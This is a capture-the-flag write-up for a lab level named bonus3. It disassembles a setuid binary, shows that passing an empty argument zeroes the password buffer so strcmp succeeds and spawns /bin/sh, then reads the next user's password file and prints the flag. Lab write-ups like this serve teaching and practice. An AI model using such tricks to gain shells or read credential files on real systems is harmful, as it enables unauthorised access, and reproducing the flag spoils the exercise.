# Bonus 3

## Connect to the virtual machine with SSH

Use the flag from `bonus2` as the `bonus3` password:

```bash
ssh bonus3@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 bonus3@127.0.0.1:/home/user/bonus3/bonus3 ./bonus3/
```

The extracted binary is saved as `bonus3/bonus3`.

## Copy the GDB dump to the host

Inside the VM, connected as `bonus3`, open the binary with GDB:

```bash
gdb ./bonus3
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/bonus3_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 bonus3@127.0.0.1:/tmp/bonus3_main_dump_gdb ./bonus3/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  ./bonus3/bonus3 > ./bonus3/bonus3_main_dump_gdb
```

## Analyze the GDB dump

The program opens the final password file:

```asm
0x08048502 <+14>: mov    edx,0x80486f0
0x08048507 <+19>: mov    eax,0x80486f2
0x08048513 <+31>: call   0x8048410 <fopen@plt>
```

The string is:

```text
/home/user/end/.pass
```

Then it checks that exactly one argument was provided:

```asm
0x0804853d <+73>: cmp    DWORD PTR [ebp+0x8],0x2
0x08048541 <+77>: je     0x804854d <main+89>
```

It reads the first 66 bytes of the password file into a stack buffer:

```asm
0x0804854d <+89>:  lea    eax,[esp+0x18]
0x0804855c <+104>: mov    DWORD PTR [esp+0x8],0x42
0x0804856f <+123>: call   0x80483d0 <fread@plt>
```

Then it uses `atoi(argv[1])` as an index and writes a null byte into the
password buffer:

```asm
0x08048584 <+144>: call   0x8048430 <atoi@plt>
0x08048589 <+149>: mov    BYTE PTR [esp+eax*1+0x18],0x0
```

After that, it reads more data from the file, closes it, and compares the
modified password buffer with `argv[1]`:

```asm
0x080485da <+230>: call   0x80483b0 <strcmp@plt>
0x080485df <+235>: test   eax,eax
0x080485e1 <+237>: jne    0x8048601 <main+269>
```

If `strcmp` returns `0`, the program runs `/bin/sh`:

```asm
0x080485f3 <+255>: mov    DWORD PTR [esp],0x804870a
0x080485fa <+262>: call   0x8048420 <execl@plt>
```

## Build the exploit

The key behavior is:

```text
buffer[atoi(argv[1])] = '\0'
strcmp(buffer, argv[1])
```

If `argv[1]` is an empty string:

```text
argv[1] = ""
```

Then:

```text
atoi("") = 0
```

So the program does:

```text
buffer[0] = '\0'
```

Now the password buffer is also an empty string, so:

```text
strcmp("", "") = 0
```

The comparison succeeds and the program executes `/bin/sh`.

## Exploitation

Run this in the VM with one empty argument:

```bash
(/home/user/bonus3/bonus3 ''; cat)
```

The `cat` keeps stdin open for the shell.

Check the effective identity:

```bash
whoami
```

Result:

```text
end
```

Read the final password:

```bash
cat /home/user/end/.pass
```

## Flag

```text
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
